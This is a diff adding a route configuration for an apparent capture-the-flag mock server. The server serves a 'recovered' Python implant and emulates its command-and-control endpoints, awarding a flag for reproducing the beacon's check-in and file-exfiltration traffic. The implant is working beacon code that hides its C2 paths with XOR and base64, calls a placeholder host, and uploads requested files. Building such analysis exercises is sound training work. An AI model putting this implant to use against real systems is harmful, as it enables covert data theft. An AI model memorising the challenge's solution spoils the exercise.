@@ -1,0 +1,106 @@
+ttl_minutes = 60
+flag_prefix = "bot"
+
+[[route]]
+method = "GET"
+path = "/"
+[route.respond]
+status = 404
+content_type = "text/plain; charset=utf-8"
+body = '''Not Found'''
+
+[[route]]
+method = "GET"
+path = "/dl/implant.py.txt"
+[route.respond]
+status = 200
+content_type = "text/plain; charset=utf-8"
+headers = { "content-disposition" = 'attachment; filename="implant.py.txt"' }
+body = '''# implant.py - recovered from an infected laptop (renamed, will not be run)
+import base64, json, time, urllib.request
+
+BOT = "{{d:bot}}"
+K = 0x5A
+C2 = "https://sync.cloudfront-static.invalid"
+
+
+def u(b):
+    return bytes(x ^ K for x in base64.b64decode(b)).decode()
+
+
+P = {
+    "checkin": u("dTsqM3UsaHUpdTkz"),
+    "tasks": u("dTsqM3UsaHUpdS4x"),
+    "result": u("dTsqM3UsaHUpdSgp"),
+    "ua": u("CTY7OTF1bnRoenINMzQ+NS0pYXoePykxLjUqcw==")
+}
+
+
+def call(path, data=None):
+    req = urllib.request.Request(C2 + path, data=json.dumps(data).encode() if data is not None else None)
+    req.add_header("User-Agent", P["ua"])
+    req.add_header("Content-Type", "application/json")
+    return json.load(urllib.request.urlopen(req, timeout=10))
+
+
+def run(task, session):
+    if task["op"] == "exfil":
+        blob = base64.b64encode(open(task["what"], "rb").read()).decode()
+        return call(P["result"] + "?s=" + session, {"id": BOT, "task": task["id"], "data": blob})
+
+
+def main():
+    r = call(P["checkin"], {"id": BOT, "os": "win10", "pid": 4120})
+    s = r["session"]
+    while True:
+        t = call(P["tasks"] + "?s=" + s)
+        for task in t["tasks"]:
+            run(task, s)
+        time.sleep(600)
+
+
+if __name__ == "__main__":
+    main()
+'''
+
+[[route]]
+method = "POST"
+path = "/api/v2/s/ci"
+sets = ["registered"]
+[route.when]
+header = { "user-agent" = 'Slack/4.2 (Windows; Desktop)' }
+body = 're:"id":\s*"{{d:bot}}"'
+[route.respond]
+status = 200
+content_type = "application/json"
+body = '''{"session":"{{d:sess}}","interval":600}'''
+
+[[route]]
+method = "GET"
+path = "/api/v2/s/tk"
+needs = ["registered"]
+[route.when]
+header = { "user-agent" = 'Slack/4.2 (Windows; Desktop)' }
+query = { "s" = '{{d:sess}}' }
+[route.respond]
+status = 200
+content_type = "application/json"
+body = '''{"tasks":[{"id":7,"op":"exfil","what":"C:\\Users\\Public\\ledger.xlsx"}]}'''
+
+[[route]]
+method = "POST"
+path = "/api/v2/s/rs"
+needs = ["registered"]
+[route.when]
+header = { "user-agent" = 'Slack/4.2 (Windows; Desktop)' }
+query = { "s" = '{{d:sess}}' }
+body = 're:"task":\s*7'
+[route.respond]
+status = 200
+content_type = "application/json"
+body = '''{"ack":7,"note":"{{flag}}"}'''
+
+[fallback]
+status = 403
+content_type = "application/json"
+body = '{"error":"bad session"}'
